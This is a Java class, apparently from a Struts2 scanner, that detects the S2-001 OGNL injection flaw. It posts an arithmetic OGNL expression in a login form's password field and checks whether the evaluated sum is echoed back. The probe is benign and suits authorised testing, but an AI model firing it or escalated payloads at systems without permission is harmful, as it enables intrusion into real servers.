package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_001 implements Check {
        public String check_poc = "%%{%s+%s}";

    public String printInfo(){
        String info = "[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password";
        return  info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        Map<String,String> data = new HashMap<String,String>();


        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = String.format(check_poc, number1, number2);
        data.put("username","test");
        data.put("password",poc);
        if(path == null){
            path = "/login.action";
        }else if(!path.endsWith(".action")){
            path = path+"login.action";
        }
        String url = protocol+"://"+host+":"+port+path;
        int numsum = number1+number2;


        try {
            HttpResult result = HttpClient.post(url,data);
            Pattern p = Pattern.compile(String.valueOf(numsum));
            Matcher m =p.matcher(result.getData());
            if(m.find()){
                return true;
            }else{
                return false;
            }

        }catch (Exception e){
            return false;
        }



    }


}
